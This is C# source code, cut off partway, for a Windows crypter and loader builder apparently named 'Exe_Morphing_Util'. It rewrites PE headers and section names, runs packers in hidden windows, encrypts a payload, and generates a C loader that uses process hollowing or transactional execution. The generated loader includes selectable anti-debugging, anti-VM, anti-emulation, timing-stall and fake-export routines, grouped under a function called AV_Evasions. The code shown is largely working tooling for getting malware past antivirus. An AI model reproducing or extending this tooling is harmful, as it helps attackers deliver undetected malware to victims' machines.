using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;


namespace Exe_Morphing_Util
{

    public partial class FormMain : Form
    {
        
        public int payloadcryptkey;
        bool devmode = true;

        private static string RandomStringJustChars(int size) // C demands things start with chars not numbers for function names
        {
            Sleep(300); // more random
            string _chars = "abcdefghijklmnopqrstuvwxyz";
            Random _rng = new Random((int)GetTickCount());
            char[] buffer = new char[size];

            for (int i = 0; i < size; i++)
            {
                buffer[i] = _chars[_rng.Next(_chars.Length)];
            }
            return new string(buffer);
        }



        private string[] str_psapi_funcs = new string[]
        {
            "GetProcessMemoryInfo"
        };

        private string[] str_kernel32_funcs = new string[]
        {
            "GetCurrentProcess",
			"VirtualAllocExNuma",
			"VirtualAlloc",
			"Sleep",
			"VirtualFree",
			"GetProcAddress",
			"FlsAlloc"
			
        };
        private string[] str_time_funcs = new string[] // Winmm.dll
        {
            "timeGetTime"
        };
        private string[] str_user32_funcs = new string[]
        {
            "CreateWindowExA",
			"MessageBoxA"
        };

        public FormMain()
        {
            InitializeComponent();
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 GetTickCount();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void Sleep(int seconds);

        private void btnLoadFile_Click(object sender, EventArgs e)
        {
            
        }
        public string Byte2Str(byte[] buff)
        {
            int i;
            string dest = "";
            for (i = 0; i < buff.Length; i++)
            {
                dest += String.Format("{0:X2} ", buff[i]);
            }
            return dest;
        }
        private void PackerOptions()
        {
            if (rbCExe.Checked)
            {
                cexepack();
            }
            if (rbKkrunchy.Checked)
            {
                kkrunchypack();
            }
            if (rbMPRESS.Checked)
            {
                mpresspack();
            }
            if (rbUPX.Checked)
            {
                upxpack();
            }
            if (rbXPack.Checked)
            {
                xpack();
            }
        }
        private void xpack()
        {
            string file = tbfilehere.Text;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\packers\\XPackc.exe " + "\"" + file + "\"";
            p.Start();
            
        }
        private void mpresspack()
        {
            string file = tbfilehere.Text;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\packers\\mpress.exe " + "\"" + file + "\"";
            p.Start();
        }
        private void upxpack()
        {
            string file = tbfilehere.Text;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\packers\\upx.exe " + "\"" + file + "\"";
            p.Start();
        }
        private void kkrunchypack()
        {
            string file = tbfilehere.Text;
            ProcessStartInfo proc = new ProcessStartInfo();

            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\packers\\kkrunchy_k7.exe -b" + "\"" + file + "\"";
            
        }
        private void cexepack()
        {
            string file = tbfilehere.Text;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\packers\\cexe.exe " + "\"" + file + "\"";
            p.Start();
        }

        private void btnMorph_Click(object sender, EventArgs e)
        {
            // for table of geo locations, use https://docs.microsoft.com/en-us/windows/desktop/Intl/table-of-geographical-locations
            // at some point, query for test signing with WMI via https://docs.microsoft.com/en-us/previous-versions/windows/desktop/bcd/bcdstore
            // US is 244
            if (tbfilehere.Text == "")
            {
                MessageBox.Show("Error, no file loaded", "Error");
                return;
            }
            if (cbJunkBytes.Checked && tbJunkBytes.Text == "")
            {
                    MessageBox.Show("Missing Junk Chars!","Error!");
                    return;
            }
            bgw.RunWorkerAsync();
            
            
        }
        public bool IsExecutable(string filename)
        {
            FileStream fs = new FileStream(filename, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            byte a, b;
            a = br.ReadByte();
            b = br.ReadByte();
            if ((char)a == 'M' && (char)b == 'Z')
            {
               
                br.Close();
                fs.Close();
                return true;
            }
            else
            {
                MessageBox.Show("Not an EXE","Error!");
                br.Close();
                fs.Close();
                return false;
            }
            
        }

        public void RandomSectionNames(string path)
        { 
            PeHeaderReader lolpe = new PeHeaderReader(path);
            int numberofsections = lolpe.FileHeader.NumberOfSections;
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            BinaryWriter bw = new BinaryWriter(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
            int my_e_lfanew = br.ReadInt32();
            fs.Seek(my_e_lfanew + 248, SeekOrigin.Begin);

            for (int x = 0; x < numberofsections; x++)
            {
                byte[] NewSectionName = Encoding.ASCII.GetBytes(RandomString(8));
                bw.Write(NewSectionName);
                // section names 32 bytes apart
                fs.Seek(32,SeekOrigin.Current);
            }
            bw.Close();
            br.Close();
            fs.Close();
        }

        public void NullifyMZHeader(string path)
        {
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            byte[] nullmeout;
            
            fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
            int my_e_lfanew;
            my_e_lfanew = br.ReadInt32(); // number of bytes to stop at
            fs.Seek(2, SeekOrigin.Begin); // skip MZ bytes
            nullmeout = br.ReadBytes(my_e_lfanew);

            for (int x = 0; x < nullmeout.Count() - 2; x++)
            {
                if (x == 58)
                {
                    nullmeout[x] = (byte)my_e_lfanew; // save the e_lfanew value (60 -2 for MZ)

                }
                else
                {
                    nullmeout[x] = 0x00;
                }
            }

            fs.Seek(2, SeekOrigin.Begin);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(nullmeout, 0, nullmeout.Count());
            bw.Close();
            br.Close();
            fs.Close();
           
        }
        public void ModTimeStamp(string path)
        {
            Random rab = new Random((int)GetTickCount());
            UInt32 timestamp = (UInt32)rab.Next(Int32.MinValue, Int32.MaxValue);
            FileStream fs = new FileStream(path, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
            int my_e_lfanew;
            my_e_lfanew = br.ReadInt32(); // number of bytes to stop at
            fs.Seek(0, SeekOrigin.Begin); // set position back to 0;
            fs.Seek(my_e_lfanew + 8, SeekOrigin.Begin); // jump to offset of timestamp from PE file header which is 16 bytes past the e_lfanew value. 
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(timestamp); // write the default for shits and giggles. 
            bw.Close();
            br.Close();
            fs.Close();
        }
        public void InsertJunkBytes(string path)
        {
            FileStream fs = new FileStream(path, FileMode.Append);
            string junkbytes = tbJunkBytes.Text;
            
            // From string to byte array
            byte[] buffer = Encoding.ASCII.GetBytes(junkbytes);
            for (int x = 0; x < 200; x++)
            {
                fs.Write(buffer, 0, buffer.Length);
            }
            fs.Close();
            
        }
        public void AddPEChari(string path) // wacky logic to set PE characteristics, supports 32 and 64 bit
        {
            PeHeaderReader lolpe = new PeHeaderReader(path);
            ushort pechar = lolpe.FileHeader.Characteristics;
            if (pechar == 0xFFBF)
            {
                ushort characteristic = 0x3022;

                FileStream fs = new FileStream(path, FileMode.Open);
                BinaryReader br = new BinaryReader(fs);
                fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
                int my_e_lfanew;
                my_e_lfanew = br.ReadInt32(); // number of bytes to stop at

                fs.Seek(0, SeekOrigin.Begin); // set position back to 0;
                fs.Seek(my_e_lfanew + 22, SeekOrigin.Begin); // jump to offset of characteristics from PE file header which is 16 bytes past the e_lfanew value. 
                BinaryWriter bw = new BinaryWriter(fs);
                
                bw.Write(characteristic); // write the default for shits and giggles. 
                bw.Close();
                br.Close();
                fs.Close();
            }

            if (pechar == 0xDFBF)
            {
                
                ushort characteristic = 0x1022;
                
                FileStream fs = new FileStream(path, FileMode.Open);
                BinaryReader br = new BinaryReader(fs);
                fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
                int my_e_lfanew;
                my_e_lfanew = br.ReadInt32(); // number of bytes to stop at

                fs.Seek(0, SeekOrigin.Begin); // set position back to 0;
                fs.Seek(my_e_lfanew + 22, SeekOrigin.Begin); // jump to offset of characteristics from PE file header which is 16 bytes past the e_lfanew value. 
                BinaryWriter bw = new BinaryWriter(fs);
                
                bw.Write(characteristic); // write the default for shits and giggles. 
                bw.Close();
                br.Close();
                fs.Close();
            }
            else
            {
                
                // write new characteristics
                ushort characteristic = 0xDFBF; //  set all flags except (dll)
                if (path.Contains(".dll"))
                {
                    characteristic = 0xFFBF;
                }
                // ushort characteristic = 0xDFBF // set them all
                FileStream fs = new FileStream(path, FileMode.Open);
                BinaryReader br = new BinaryReader(fs);
                fs.Seek(0x3c, SeekOrigin.Begin); // go to the value of e_lfanew
                int my_e_lfanew;
                my_e_lfanew = br.ReadInt32(); // number of bytes to stop at
                fs.Seek(0, SeekOrigin.Begin); // set position back to 0;
                fs.Seek(my_e_lfanew + 22, SeekOrigin.Begin); // jump to offset of characteristics from PE file header which is 16 bytes past the e_lfanew value. 
                BinaryWriter bw = new BinaryWriter(fs);
               
                bw.Write(characteristic); // write the default for shits and giggles. 
                bw.Close();
                br.Close();
                fs.Close();
            }

        }
        public void WriteCharsToRsc(string path) // lets work this out
        {
            PeHeaderReader lolpe = new PeHeaderReader(path);
            if (lolpe.FileHeader.Machine == 0x014C) // 32 bit
            {
                uint reSize32 = lolpe.OptionalHeader32.ResourceTable.Size;
                uint reRVA32 = lolpe.OptionalHeader32.ResourceTable.VirtualAddress;
                
                if (reSize32 == 0)
                { 
                    MessageBox.Show("Exe has no resource section to mess with :\\", "Error!");
                    return;
                }
                FileStream fs = new FileStream(path, FileMode.Open);
                fs.Seek(reRVA32, SeekOrigin.Current);
                byte[] Rsrc = new byte[reSize32];
                fs.Read(Rsrc, 0, (int)reSize32);
                byte[] findnulls =    { 0xFF, 0xFF, 0xFF, 0xFF };
                byte[] replacenulls = { 0x4A, 0x4F, 0x45, 0x47 };
                byte[] result = ReplaceForMe(Rsrc, findnulls, replacenulls);
                fs.Seek(reRVA32, SeekOrigin.Begin);
                fs.Write(result, 0, (int)reSize32);
                fs.Close();

            }
            if (lolpe.FileHeader.Machine == 0x8664) // 64 bit
            {
                uint reSize64 = lolpe.OptionalHeader64.ResourceTable.Size;
                uint reRVA64 = lolpe.OptionalHeader64.ResourceTable.VirtualAddress;
                if (reSize64 == 0)
                {
                    MessageBox.Show("Exe has no resource section to mess with :/", "Error!");
                    return;
                }
                FileStream fs = new FileStream(path, FileMode.Open);
                fs.Seek(reRVA64, SeekOrigin.Current);
                byte[] Rsrc = new byte[reSize64];
                fs.Read(Rsrc, 0, (int)reSize64);
                byte[] findnulls =    { 0xFF, 0xFF, 0xFF, 0xFF };
                byte[] replacenulls = { 0x4A, 0x4F, 0x45, 0x47 };

                byte[] result = ReplaceForMe(Rsrc, findnulls, replacenulls);
                fs.Seek(reRVA64, SeekOrigin.Begin);
                fs.Write(result, 0, (int)reSize64);
                fs.Close();

            }
            return;
        }
        public void ConvertBPs2WAITs(string path)
        {
            byte[] findnulls = { 0xCC, 0xCC, 0xCC, 0xCC };
            byte[] replacenulls = { 0x9b, 0x9b, 0x9b, 0x9b };

            PeHeaderReader lolpe = new PeHeaderReader(path);
            UInt32 entrypointondisk = lolpe.ImageSectionHeaders[0].PointerToRawData;
            UInt32 stoppoint = lolpe.ImageSectionHeaders[0].SizeOfRawData;
            FileStream fs = new FileStream(path, FileMode.Open);
            fs.Seek(entrypointondisk, SeekOrigin.Current);
            byte[] CodeSect = new byte[stoppoint];
            fs.Read(CodeSect, 0, (int)stoppoint);
            byte[] result = ReplaceForMe(CodeSect, findnulls, replacenulls);
            fs.Seek(entrypointondisk, SeekOrigin.Begin);
            fs.Write(result, 0, (int)stoppoint);
            fs.Close();

        }

        public void ConvertBPs2Xchg(string path)
        {  
            byte[] findnulls =    { 0xCC, 0xCC, 0xCC, 0xCC };
            byte[] replacenulls = { 0x93, 0x93, 0x93, 0x93 };

            PeHeaderReader lolpe = new PeHeaderReader(path);
            UInt32 entrypointondisk = lolpe.ImageSectionHeaders[0].PointerToRawData;
            UInt32 stoppoint = lolpe.ImageSectionHeaders[0].SizeOfRawData;
            FileStream fs = new FileStream(path, FileMode.Open);
            fs.Seek(entrypointondisk, SeekOrigin.Current);
            byte[] CodeSect = new byte[stoppoint];
            fs.Read(CodeSect, 0, (int)stoppoint);
            byte[] result = ReplaceForMe(CodeSect, findnulls, replacenulls);
            fs.Seek(entrypointondisk, SeekOrigin.Begin);
            fs.Write(result, 0, (int)stoppoint);
            fs.Close();

        }

        public void ConvertBPs2Nops(string path) 
        { 
            byte[] findnulls =    { 0xCC, 0xCC, 0xCC, 0xCC };
            byte[] replacenulls = { 0x90, 0x90, 0x90, 0x90 };

            PeHeaderReader lolpe = new PeHeaderReader(path);
            UInt32 entrypointondisk = lolpe.ImageSectionHeaders[0].PointerToRawData;
            UInt32 stoppoint = lolpe.ImageSectionHeaders[0].SizeOfRawData;
            FileStream fs = new FileStream(path, FileMode.Open);
            fs.Seek(entrypointondisk, SeekOrigin.Current);
            byte[] CodeSect = new byte[stoppoint];
            fs.Read(CodeSect, 0, (int)stoppoint);
            byte[] result = ReplaceForMe(CodeSect, findnulls, replacenulls);
            fs.Seek(entrypointondisk, SeekOrigin.Begin);
            fs.Write(result, 0, (int)stoppoint);
            fs.Close();
        }
        public void ConvertBPs2FNops(string path)
        {
            byte[] findnulls =    { 0xCC, 0xCC, 0xCC, 0xCC };
            byte[] replacenulls = { 0xD9, 0xD0, 0xD9, 0xD0 }; // FPU-NOP

            PeHeaderReader lolpe = new PeHeaderReader(path);
            UInt32 entrypointondisk = lolpe.ImageSectionHeaders[0].PointerToRawData;
            UInt32 stoppoint = lolpe.ImageSectionHeaders[0].SizeOfRawData;
            FileStream fs = new FileStream(path, FileMode.Open);
            fs.Seek(entrypointondisk, SeekOrigin.Current);
            byte[] CodeSect = new byte[stoppoint];
            fs.Read(CodeSect, 0, (int)stoppoint);
            byte[] result = ReplaceForMe(CodeSect, findnulls, replacenulls);
            fs.Seek(entrypointondisk, SeekOrigin.Begin);
            fs.Write(result, 0, (int)stoppoint);
            fs.Close();
        }

        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }
        

        private byte[] ReplaceForMe(byte[] input, byte[] pattern, byte[] replacement)
        {
            if (pattern.Length == 0)
            {
                return input;
            }

            List<byte> result = new List<byte>();

            int i;

            for (i = 0; i <= input.Length - pattern.Length; i++)
            {
                bool foundMatch = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (input[i + j] != pattern[j])
                    {
                        foundMatch = false;
                        break;
                    }
                }

                if (foundMatch)
                {
                    result.AddRange(replacement);
                    i += pattern.Length - 1;
                }
                else
                {
                    result.Add(input[i]);
                }
            }

            for (; i < input.Length; i++)
            {
                result.Add(input[i]);
            }

            return result.ToArray();
        }

        private const string _chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        private readonly Random _rng = new Random((int)GetTickCount());

        private string RandomString(int size)
        {
            char[] buffer = new char[size];

            for (int i = 0; i < size; i++)
            {
                buffer[i] = _chars[_rng.Next(_chars.Length)];
            }
            return new string (buffer);
        }


        private void bgw_DoWork(object sender, DoWorkEventArgs e)
        {
            string file_gonna_mess_with = tbfilehere.Text;
            // anything that happens happens here for the sake of being able to quit should the need arise
            File.Copy(tbfilehere.Text, tbfilehere.Text + ".bak",true); // save backup before changing stuff

            if (!IsExecutable(file_gonna_mess_with))
            {
                MessageBox.Show("Error, file is not an EXE!", "Error");
                return;
            }
            if (cbNullMZ.Checked)
            {
                NullifyMZHeader(file_gonna_mess_with);
            }
            if (cbResourceChars.Checked)
            {
                WriteCharsToRsc(file_gonna_mess_with);
            }
            if (cbTimeStamp.Checked)
            {
                ModTimeStamp(file_gonna_mess_with);
            }
            if (cbRandomSectionNames.Checked)
            {
                RandomSectionNames(file_gonna_mess_with);
            }
            if (cbPEChar.Checked)
            {
                AddPEChari(file_gonna_mess_with);
            }
            if (cbJunkBytes.Checked)
            {
                InsertJunkBytes(file_gonna_mess_with);
            }
            if (rbConvBP2NOP.Checked)
            {
                ConvertBPs2Nops(file_gonna_mess_with);
            }
            if (rbConvBP2XCHG.Checked)
            {
                ConvertBPs2FNops(file_gonna_mess_with);
            }
            if (rbConvBP2XCHG.Checked)
            {
                ConvertBPs2Xchg(file_gonna_mess_with);
            }
            if (rbBP2WAIT.Checked)
            {
                ConvertBPs2WAITs(file_gonna_mess_with);
            }

            // Pack last

            PackerOptions();

            if (File.Exists("\\builder\\res\\pload.joe"))
            {
                File.Delete("\\builder\\res\\pload.joe");
            }
            if (File.Exists("\\builder\\res\\tempload.joe"))
            {
                File.Delete("\\builder\\res\\tempload.joe");
            }
            if (File.Exists("\\output_dir\\gogopowerrangers.exe"))
            {
                File.Delete("\\output_dir\\gogopowerrangers.exe");
            }
            // why not base64 it FIRST, then encrypt it when its in that format, THEN decrypt to b64 and run?
            // no, ENCRYPT FIRST
            // THEN BASE64 ENCODE for storage
            // then base64 decode 
            // then decrypt LAST
            encryptpayload(tbfilehere.Text);
            // superceced by encryption
            // B64_payload(Application.StartupPath + "\\builder\\res\\tempload.joe");
            // 
            AV_Evasions();
            MakeLoader();
            Process.Start(Application.StartupPath + "\\output_dir\\");
            //AddToIAT(FLSTrick(), tbfilehere.Text);
            // now lets have some fun - modify the main exe, add a new section, mark it RWE, add code to it?
            // FillNewSection(tbfilehere.Text, 7);
            // ok, new section crearted, added crap to it, plus jump home
            // no, we're doing the C compiler / runpe method. fuck doing it outselves in C#

            //MessageBox.Show("All Done!", "=]");
        }
        private uint ImportHintNameTableRVA(PeHeaderReader lolpe)
        { 
                if (lolpe.FileHeader.Machine == 0x014C)
                {
                    UInt32 ImportDirectoryRVA = lolpe.OptionalHeader32.ImportTable.VirtualAddress;
                    return (ImportDirectoryRVA + 48 + 15) & ~15U;
                }
                else
                {
                    UInt32 ImportDirectoryRVA = lolpe.OptionalHeader64.ImportTable.VirtualAddress;
                    return (ImportDirectoryRVA + 48 + 4 + 15) & ~15U;
                }
            
        }
        private void AssertRVA(FileStream fs, uint rva, PeHeaderReader lolpe)
        {
            System.Diagnostics.Debug.Assert(fs.Position - lolpe.ImageSectionHeaders[0].PointerToRawData + 0x2000 == rva);
        }
        
        private void AV_Evasions()
        {

            // gonna need to find the EP, save it, find a cave, replace the intial stack frame setup (push ebp, mov ebp, esp) 
            // with long jmp to our found code cave, have it jump back when done to our EP
            if(cbTLS.Checked)
            {
                // see if we want to use process hollowing or just extract
                if (rbJustExtract.Checked)
                {
                    File.Copy("barebones\\dont_touch_me_TLS_callbacks_just_extract.joe", "builder\\joe_crypter.c", true);
                }
                else if(rbTransactional.Checked)
                {
                    File.Copy("barebones\\dont_touch_me_TLS_callbacks_Transactional.joe", "builder\\joe_crypter.c", true);
                }
                else
                {   // not these 2? process hollowing is default
                    File.Copy("barebones\\dont_touch_me_TLS_callbacks.joe", "builder\\joe_crypter.c", true); 
                }
                
            
                string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
                replacecrypto = replacecrypto.Replace("cryptokey",payloadcryptkey.ToString());
                replacecrypto = replacecrypto.Replace("changemealreadyincode", RandomStringJustChars(12)); // TLS CALLBACK func NAME
                File.WriteAllText("builder\\joe_crypter.c", replacecrypto);

                FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
                StreamWriter sw = new StreamWriter(fs);
                // make adjustments to file based on checkboxes

                // now we do our evasions
                fs.Seek(1956, SeekOrigin.Begin);  // be mindful of where this is. 

                if(cbTestSigning.Checked)
                {
                    sw.WriteLine("TestSigningCheck();");
                }

                if (cbAntiDebug.Checked)
                {
                    sw.WriteLine("checkQIP();");
                    sw.WriteLine("if (GetNtGlobalFlags() == 'p')");
                    sw.WriteLine("{");
                    sw.WriteLine("PassToNoobs();");
                    sw.WriteLine("}");
                    sw.WriteLine("if (GetBeingDebugged())");
                    sw.WriteLine("{");
                    sw.WriteLine("PassToNoobs();");
                    sw.WriteLine("}");
                    sw.WriteLine("GetHeapFlags();");
                    sw.WriteLine("AnotherAntiDebugRoutine();");
                    sw.WriteLine("GS_Check();");
                }
                if (cbAntiEmu.Checked)
                {
                    sw.WriteLine("AntiEmu();");
                }
                if (cbAntiVM.Checked)
                {
                    sw.WriteLine("special_usercheck();");
                    sw.WriteLine("MemSizeTrick();");
                    sw.WriteLine("if (IsInsideVMWare())");
                    sw.WriteLine("{");
                    sw.WriteLine("PassToNoobs();");
                    sw.WriteLine("}");
                    sw.WriteLine("reg_enum_vm_check();");
                    sw.WriteLine("anti_vm_wmi();");
                    Random ran = new Random();
                    int rando = ran.Next(1, 7);
                    switch (rando)
                    {
                        case 1:
                            sw.WriteLine("anti_vm_wmi_1();");
                            break;
                        case 2:
                            sw.WriteLine("anti_vm_wmi_2();");
                            break;
                        case 3:
                            sw.WriteLine("anti_vm_wmi_3();");
                            break;
                        case 4:
                            sw.WriteLine("anti_vm_wmi_4();");
                            break;
                        case 5:
                            sw.WriteLine("anti_vm_wmi_5();");
                            break;
                        case 6:
                            sw.WriteLine("anti_vm_wmi_6();");
                            break;
                        case 7:
                            sw.WriteLine("anti_vm_wmi_7();");
                            break;
                    }
                }
                if (cbSpecial.Checked)
                {
                    sw.WriteLine("JoeSpecial();");

                }

                if(cbCores.Checked)
                {
                    sw.WriteLine("CheckCoreCount();");
                }

                if (cbFLS.Checked)
                {
                    sw.WriteLine("FlsTrick();");
                }
                if (cbLongStall.Checked)
                {
                    sw.WriteLine("LongStall();");
                    sw.WriteLine("timing_evasion_1();");
                }
                if (cbSpecialStall.Checked)
                {
                    // pick 1 of 5 randomly, timing_evasion_2-6
                    Random ran = new Random();
                    int rando = ran.Next(2, 6);
                    switch (rando)
                    {
                        case 2:
                            sw.WriteLine("timing_evasion_2();");
                            break;
                        case 3:
                            sw.WriteLine("timing_evasion_3();");
                            break;
                        case 4:
                            sw.WriteLine("timing_evasion_4();");
                            break;
                        case 5:
                            sw.WriteLine("timing_evasion_5();");
                            break;
                        case 6:
                            sw.WriteLine("timing_evasion_6();");
                            break;
                    }


                }
               
                if (cbMallocTrick.Checked)
                {
                    sw.WriteLine("AllocMem_Fornoreason();");
                }
                if (cbNuma.Checked)
                {
                    sw.WriteLine("NumaEvas();");
                }
                if (cbProcessMem.Checked)
                {
                    sw.WriteLine("procmem_evas();");
                }
                if (cbDateSpecific.Checked)
                {
                    sw.WriteLine("date_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
                }
                if (cbRegionSpecific.Checked)
                {
                    sw.WriteLine("region_specific_check(\"" + cbRegion.SelectedText + "\");");
                }

                sw.Close(); fs.Close();
                // placing this here because objects are using the file, breaks shit
                if (cbFakeWindows.Checked)
                {
                    String replacelotsofwindows = File.ReadAllText("builder\\joe_crypter.c");
                    replacelotsofwindows = replacelotsofwindows.Replace("//lotsofwindowshack", "LotsOfWindows(hwnd);");
                    File.WriteAllText("builder\\joe_crypter.c", replacelotsofwindows);
                    //sw.WriteLine("LotsOfWindows(hwnd);");
                }
                if (cbFakeExports.Checked)
                {

                    string[] datatype, returntype;

                    Random rand = new Random();

                    int x = rand.Next(1, 9); // random number of exports
                    for (int y = 0; y <= x; y++)
                    {

                        string randofuncname = RandomStringJustChars(rand.Next(5, 15));
                        string randomargumentname = RandomStringJustChars(rand.Next(5, 15));
                        datatype = new string[5] { "int", "char*", "float", "double", "long" };
                        returntype = new string[5] { "int", "char*", "float", "double", "long" };
                        int q = rand.Next(0, 99999); // q is datatype
                        int r = rand.Next(1, 5); // r is data type or function arguments
                        int s = rand.Next(1, 5); // s is return type
                        string text = File.ReadAllText("builder\\joe_crypter.c");


                        text = text.Replace("//replaceatbeginning" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ");");


                        if (returntype[s] == "char*")
                        {
                            text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { " +
                                "\r\n \r\n __asm{ \r\n jmp eax \r\n } \r\n" +
                                "return \"" + RandomStringJustChars(rand.Next(5, 15)) + "\"; \r\n }\r\n //");

                        }
                        else
                        {
                            text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { \r\n" +
                                "\r\n \r\n __asm{ \r\n jmp ebx \r\n } \r\n" + "return " + q + "; \r\n }\r\n //");

                        }
                        File.WriteAllText("builder\\joe_crypter.c", text);


                    }

                }

                return;
            }
            // no tls? go here. Just placing it here to make it easier. 
            evasions_no_tls();


        }
        private void evasions_no_tls()
        {
            if (rbJustExtract.Checked)
            {
                File.Copy("barebones\\dont_touch_me_just_extract.joe", "builder\\joe_crypter.c", true);
            }
            else if (rbTransactional.Checked)
            {
                File.Copy("barebones\\dont_touch_me_Transactional.joe", "builder\\joe_crypter.c", true);
            }
            else
            {
                File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
            }
            FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
            StreamWriter sw = new StreamWriter(fs);


            // set payload cryptokey
            string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
            replacecrypto = replacecrypto.Replace("cryptokey", payloadcryptkey.ToString());
            File.WriteAllText("builder\\joe_crypter.c", replacecrypto);

            // make adjustments to file based on checkboxes

            // now we do our evasions
            fs.Seek(2022, SeekOrigin.Begin);

            if (cbTestSigning.Checked)
            {
                sw.WriteLine("TestSigningCheck();");
            }

            if (cbAntiDebug.Checked)
            {
                sw.WriteLine("checkQIP();");
                sw.WriteLine("if (GetNtGlobalFlags() == 'p')");
                sw.WriteLine("{");
                sw.WriteLine("PassToNoobs();");
                sw.WriteLine("}");
                sw.WriteLine("if (GetBeingDebugged())");
                sw.WriteLine("{");
                sw.WriteLine("PassToNoobs();");
                sw.WriteLine("}");
                sw.WriteLine("GetHeapFlags();");
                sw.WriteLine("AnotherAntiDebugRoutine();");
                sw.WriteLine("GS_Check();");
            }
            if (cbAntiEmu.Checked)
            {
                sw.WriteLine("AntiEmu();");
            }
            if (cbAntiVM.Checked)
            {
                sw.WriteLine("special_usercheck();");
                sw.WriteLine("MemSizeTrick();");
                sw.WriteLine("if (IsInsideVMWare())");
                sw.WriteLine("{");
                sw.WriteLine("PassToNoobs();");
                sw.WriteLine("}");
                sw.WriteLine("reg_enum_vm_check();");
                Random ran = new Random();
                int rando = ran.Next(1, 7);
                switch (rando)
                {
                    case 1:
                        sw.WriteLine("anti_vm_wmi_1();");
                        break;
                    case 2:
                        sw.WriteLine("anti_vm_wmi_2();");
                        break;
                    case 3:
                        sw.WriteLine("anti_vm_wmi_3();");
                        break;
                    case 4:
                        sw.WriteLine("anti_vm_wmi_4();");
                        break;
                    case 5:
                        sw.WriteLine("anti_vm_wmi_5();");
                        break;
                    case 6:
                        sw.WriteLine("anti_vm_wmi_6();");
                        break;
                    case 7:
                        sw.WriteLine("anti_vm_wmi_7();");
                        break;
                }

            }
            if (cbSpecial.Checked)
            {
                sw.WriteLine("JoeSpecial();");

            }

            if (cbCores.Checked)
            {
                sw.WriteLine("CheckCoreCount();");
            }

            if (cbFakeWindows.Checked)
            {
                sw.WriteLine("LotsOfWindows(hwnd);");
            }
            if (cbFLS.Checked)
            {
                sw.WriteLine("FlsTrick();");
            }
            if (cbLongStall.Checked)
            {
                sw.WriteLine("LongStall();");
                sw.WriteLine("timing_evasion_1();");
            }
            if (cbSpecialStall.Checked)
            {
                // pick 1 of 5 randomly, timing_evasion_2-6
                Random ran = new Random();
                int rando = ran.Next(2, 6);
                switch (rando)
                {
                    case 2:
                        sw.WriteLine("timing_evasion_2();");
                        break;
                    case 3:
                        sw.WriteLine("timing_evasion_3();");
                        break;
                    case 4:
                        sw.WriteLine("timing_evasion_4();");
                        break;
                    case 5:
                        sw.WriteLine("timing_evasion_5();");
                        break;
                    case 6:
                        sw.WriteLine("timing_evasion_6();");
                        break;
                }


            }
            
            if (cbMallocTrick.Checked)
            {
                sw.WriteLine("AllocMem_Fornoreason();");
            }
            if (cbNuma.Checked)
            {
                sw.WriteLine("NumaEvas();");
            }
            if (cbProcessMem.Checked)
            {
                sw.WriteLine("procmem_evas();");
            }
            if (cbDateSpecific.Checked)
            {
